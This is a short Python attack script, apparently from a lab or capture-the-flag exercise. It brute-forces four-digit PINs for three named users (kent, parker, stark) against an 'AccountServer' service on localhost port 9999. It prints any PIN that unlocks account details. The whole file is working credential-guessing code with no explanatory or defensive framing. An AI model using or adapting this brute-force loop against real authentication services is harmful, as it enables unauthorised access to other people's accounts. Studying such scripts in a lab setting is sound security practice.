#!/usr/bin/python

import socket

s = socket.create_connection(('127.0.0.1', 9999), 3.0)
print (s.recv(1024))  # receive initial prompt

for user in ['kent', 'parker', 'stark']:
    for pin in range(1000, 10000):
        s.send('list %s %i' % (user, pin))

        response = s.recv(1024)  # receive initial prompt
        # print 'tesing pin %i -- %s' % (pin, response)
        if response.find('type') > -1:
            print ("%s's pin: %i" % (user, pin))
            print (response)
            while response.find('AccountServer>') == -1:
                response = s.recv(1024)  # receive initial prompt
                print (response)
            break
        else:
            while response.find('AccountServer>') == -1:
                response = s.recv(1024)  # receive initial prompt

s.close()

